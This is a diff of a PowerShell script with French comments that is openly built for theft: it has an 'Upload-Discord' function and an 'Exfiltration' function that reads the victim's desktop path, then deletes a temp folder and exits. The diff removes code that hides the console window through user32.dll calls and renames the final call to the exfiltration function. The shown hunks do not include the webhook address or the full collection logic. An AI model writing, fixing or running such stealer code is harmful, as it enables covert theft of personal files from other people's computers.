@@ -1,16 +1,3 @@
-# Définir la classe User32 pour interagir avec l'API Windows
-Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class User32 {
-        [DllImport("user32.dll")]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
-    }
-"@
-
-Add-Type -Name win -MemberDefinition ‘[DllImport(« user32.dll »)] public static extern bool ShowWindow(int handle, int state);’ -Namespace native [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle,0)
-
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -34,7 +21,7 @@ function Upload-Discord {
     }
 }
 
-# Fonction Exfiltration
+# Créer un scriptblock pour la fonction Exfiltration
 function Exflitration {
     # Get desktop path
     $desktop = [Environment]::GetFolderPath("Desktop")
@@ -124,6 +111,6 @@ function Exflitration {
         rmdir -R \temp
         exit
     }
-    
-# Lancer la fonction Exfiltration 
-Exfiltration
+
+#Call Exflitration
+Exflitration
